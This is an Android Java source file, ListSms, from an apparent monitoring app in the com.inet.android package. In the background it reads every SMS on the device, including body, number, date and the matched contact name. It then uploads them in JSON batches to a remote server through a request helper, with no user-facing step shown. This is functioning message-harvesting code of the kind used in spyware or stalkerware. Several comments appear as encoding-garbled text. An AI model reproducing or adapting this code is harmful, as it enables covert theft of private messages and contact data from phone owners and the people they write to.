package com.inet.android.list;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract.PhoneLookup;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

/**
 * ListApp class is designed to get the list of sms
 * 
 * @author johny homicide
 * 
 */
public class ListSms extends AsyncTask<Context, Void, Void> {
	private Context mContext;
	private String LOG_TAG = ListSms.class.getSimpleName().toString();
	private String complete;
	private int version;

	public void getSmsLogs() {
		String sendStr = null;
		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_SMS , mContext);
		
		// -------------- for---------------------------------------------

		Uri uri = Uri.parse("content://sms");
		Cursor sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
				null, "date desc");
		Logging.doLog(LOG_TAG, "readSMS", "readSMS");

		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
			complete = "0";
			// Read the sms data and store it in the list
			if (sms_sent_cursor != null) {
				// ôîðìèðóåì JSONobj
				JSONObject archiveSMSJson = new JSONObject();
				if (sms_sent_cursor.moveToFirst()) {

					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
						int typeSms = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));
						int type = -1;
						switch (typeSms) {
						case 1:
							type = ConstantValue.TYPE_INCOMING_SMS_REQUEST;
							break;
						case 2:
							type = ConstantValue.TYPE_OUTGOING_SMS_REQUEST;
							break;
						default:
							type = 7;
							break;
						}
						try {
							archiveSMSJson
									.put("time",
											ConvertDate.getDate(sms_sent_cursor.getLong(sms_sent_cursor
													.getColumnIndexOrThrow("date"))));
							archiveSMSJson.put("type", type);
							archiveSMSJson.put("number", sms_sent_cursor
									.getString(sms_sent_cursor
											.getColumnIndex("address")));
							archiveSMSJson.put("data", sms_sent_cursor
									.getString(sms_sent_cursor
											.getColumnIndex("body")));
							archiveSMSJson
									.put("name",
											getContactName(
													mContext,
													sms_sent_cursor
															.getString(sms_sent_cursor
																	.getColumnIndex("address"))));

							if (sendStr == null)
								sendStr = archiveSMSJson.toString();
							else
								sendStr += "," + archiveSMSJson.toString();

						} catch (JSONException e) {
							// TODO Àâòîìàòè÷åñêè ñîçäàííûé áëîê catch
							e.printStackTrace();
						}
						if (sendStr.length() >= 50000) {
							sendRequest(sendStr, complete);
							sendStr = null;
						}
						sms_sent_cursor.moveToNext();

					}
				}
				if (sendStr != null) {
					lastRaw(sendStr);
					sendStr = null;

				} else {
					lastRaw("");
					sendStr = null;
				}
				Logging.doLog(LOG_TAG, "sms_sent_cursor.close()",
						"sms_sent_cursor.close()");
				sms_sent_cursor.close();
			} else {
				Logging.doLog(LOG_TAG, "smsLogCursor == null",
						"smsLogCursor == null");
				lastRaw("");
				sendStr = null;
			}
		} else {
			endList();
			sendStr = null;
		}
	}

	private void endList() {
		TurnSendList.setList(ConstantValue.TYPE_LIST_SMS, version, "0", mContext);
	}

	private void lastRaw(String sendStr) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
		sendRequest(sendStr, complete);
	}

	private void sendRequest(String str, String complete) {
		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_SMS_REQUEST, complete, version, mContext);
	}

	private String getContactName(Context context, String phoneNumber) {
		ContentResolver cr = mContext.getContentResolver();
		Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI,
				Uri.encode(phoneNumber));
		Cursor cursor = cr.query(uri,
				new String[] { PhoneLookup.DISPLAY_NAME }, null, null, null);
		if (cursor == null) {
			return null;
		}
		String contactName = null;
		if (cursor.moveToFirst()) {
			contactName = cursor.getString(cursor
					.getColumnIndex(PhoneLookup.DISPLAY_NAME));
		}
		if (cursor != null && !cursor.isClosed()) {
			cursor.close();
		}
		return contactName;
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Àâòîìàòè÷åñêè ñîçäàííàÿ çàãëóøêà ìåòîäà
		Logging.doLog(LOG_TAG, "doInBackground");
		this.mContext = params[0];
		getSmsLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}